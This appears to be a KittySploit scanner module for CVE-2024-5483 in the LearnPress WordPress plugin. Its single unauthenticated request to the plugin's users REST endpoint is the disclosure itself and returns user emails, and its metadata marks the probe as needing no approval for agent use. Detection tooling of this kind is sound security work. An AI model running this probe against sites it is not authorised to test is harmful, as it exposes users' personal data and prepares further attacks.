#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""LearnPress – WordPress LMS Plugin contains a sensitive information exposure caused by incorrect implementation."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'LearnPress < 4.2.6.8.1 - Information Disclosure Detection',
        'description': 'LearnPress – WordPress LMS Plugin contains a sensitive information exposure caused by incorrect implementation of get_items_permissions_check function in all versions up to 4.2.6.8, letting unauthenticated attackers extract user emails and basic information.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'wordpress', 'wpscan', 'wp-plugin', 'learnpress', 'vuln', 'info-leak'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['https://wpscan.com/vulnerability/1f253156-333b-4be6-b727-06237567be1e/'],
        'cve': 'CVE-2024-5483',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-json/learnpress/v1/users', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('application/json',)
        body_all = ('id', 'email', 'username',)
        if (any(m in body for m in body_any)) and (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="LearnPress < 4.2.6.8.1 - Information Disclosure detected",
                path='/wp-json/learnpress/v1/users',
            )
            return True
        return False

